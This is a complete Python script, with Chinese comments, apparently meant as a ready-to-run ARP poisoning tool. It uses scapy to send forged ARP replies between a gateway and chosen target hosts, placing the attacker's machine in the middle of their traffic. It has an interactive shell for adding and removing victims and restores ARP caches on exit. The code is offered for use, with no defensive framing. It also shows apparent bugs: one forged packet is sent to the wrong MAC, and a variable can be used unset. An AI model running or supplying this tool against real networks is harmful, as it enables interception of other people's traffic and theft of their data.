#!/usr/bin/env python3
import sys
import argparse
import threading
import queue
import time
from scapy.all import *
import os

# index values into tuples
IP = CMD = 0
MAC = TARGET = 1

def parse_args():
    """解析命令行参数"""
    parser = argparse.ArgumentParser(description='Do ARP poisoning between ' +
                                                 'a gateway and several ' +
                                                 'targets')
    parser.add_argument('-i', '--interface', dest='interface',
                        help='interface to send from')
    parser.add_argument('-t', '--targets', dest='targets',
                        help='comma-separated list of IP addresses',
                        required=True)
    parser.add_argument('-g', '--gateway', dest='gateway',
                        help='IP address of the gateway', required=True)
    return parser.parse_args()


def resolve_mac(interface, ip):
    """解析目标的 MAC 地址"""
    try:
        arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
        answer = srp(arp_request, timeout=2, verbose=0)[0]
        if answer:
            return answer[0][1].hwsrc
        else:
            print(f"[Error] 无法解析目标 {ip} 的 MAC 地址")
            return None
    except Exception as e:
        print(f"[Error] 解析 MAC 地址时发生错误：{e}")
        return None


def send_ARP(destination_IP, source_IP, destination_MAC, source_MAC):
    """发送伪造 ARP 包"""
    if not destination_MAC:
        print(f"[Warning] 未找到 {destination_IP} 的 MAC 地址，默认使用广播。")
        destination_MAC = "ff:ff:ff:ff:ff:ff"
    ether_layer = Ether(dst=destination_MAC)
    arp_layer = ARP(op=2, pdst=destination_IP, hwdst=destination_MAC,
                    psrc=source_IP, hwsrc=source_MAC)
    packet = ether_layer / arp_layer
    sendp(packet, verbose=0)


def restore_ARP_caches(targets, gateway):
    """恢复 ARP 缓存"""
    print("停止攻击，恢复 ARP 缓存")
    for _ in range(3):
        for t in targets:
            send_ARP(t[IP], gateway[IP], t[MAC], gateway[MAC])
            send_ARP(gateway[IP], t[IP], gateway[MAC], t[MAC])
        time.sleep(1)
    print("ARP 缓存已恢复")


def start_poison_thread(targets, gateway, control_queue, attacker_MAC):
    """启动 ARP 欺骗线程"""
    finish = False
    while not finish:
        while control_queue.empty():
            for t in targets:
                send_ARP(t[IP], gateway[IP], t[MAC], attacker_MAC)
                send_ARP(gateway[IP], t[IP], t[MAC], attacker_MAC)
            time.sleep(1)

        try:
            item = control_queue.get(block=False)
        except queue.Empty:
            print("队列为空，尝试获取命令失败。")

        cmd = item[CMD].lower()
        if cmd in ['quit', 'exit', 'stop', 'leave']:
            finish = True

        elif cmd in ['add', 'insert']:
            targets.append(item[TARGET])

        elif cmd in ['del', 'delete', 'remove']:
            try:
                targets.remove(item[TARGET])
                restore_ARP_caches([item[TARGET]], gateway)
            except ValueError:
                print(f"{item[TARGET][0]} 不在目标列表中")

        elif cmd in ['list', 'show', 'status']:
            print('当前目标列表：')
            print(f'网关: {gateway[IP]} ({gateway[MAC]})')
            for t in targets:
                print(f"{t[IP]} ({t[MAC]})")

    restore_ARP_caches(targets, gateway)


def get_interface_windows():
    """获取 Windows 下的网卡接口名称"""
    interfaces = conf.ifaces
    print("可用网络接口：")
    for i in interfaces:
        print(f"{i}: {interfaces[i].name}")
    return conf.iface


def main():
    args = parse_args()
    control_queue = queue.Queue()

    # 获取接口名称
    interface = args.interface or get_interface_windows()
    conf.iface = interface

    # 获取本机的 MAC 地址
    attacker_MAC = get_if_hwaddr(interface)

    print(f'使用接口 {interface} ({attacker_MAC})')
    try:
        targets = [(t.strip(), resolve_mac(interface, t.strip())) for t in args.targets.split(',')]
    except Exception as e:
        print(f"[Error] 获取目标 MAC 地址失败：{e}")
        sys.exit(1)

    try:
        gateway = (args.gateway, resolve_mac(interface, args.gateway))
    except Exception as e:
        print(f"[Error] 获取网关 MAC 地址失败：{e}")
        sys.exit(2)

    # 启动 ARP 欺骗线程
    poison_thread = threading.Thread(target=start_poison_thread,
                                     args=(targets, gateway, control_queue, attacker_MAC))
    poison_thread.start()

    try:
        while poison_thread.is_alive():
            time.sleep(1)
            command = input('arpspoof# ').split()
            if command:
                cmd = command[CMD].lower()
                if cmd in ['help', '?']:
                    print("add <IP>: 向目标列表添加 IP 地址\n" +
                          "del <IP>: 从目标列表中移除 IP 地址\n" +
                          "list: 显示所有当前目标\n" +
                          "exit: 停止攻击并退出")

                elif cmd in ['quit', 'exit', 'stop', 'leave']:
                    control_queue.put(('quit',))
                    poison_thread.join()

                elif cmd in ['add', 'insert', 'del', 'delete', 'remove']:
                    ip = command[TARGET]
                    print(f"IP: {ip}")
                    try:
                        t = (ip, resolve_mac(interface, ip))
                        control_queue.put((cmd, t))
                    except Exception as e:
                        print(f'无法添加 {ip}')
                        print(e)

                elif cmd in ['list', 'show', 'status']:
                    control_queue.put((cmd,))

    except KeyboardInterrupt:
        control_queue.put(('quit',))
        poison_thread.join()


if __name__ == '__main__':
    main()
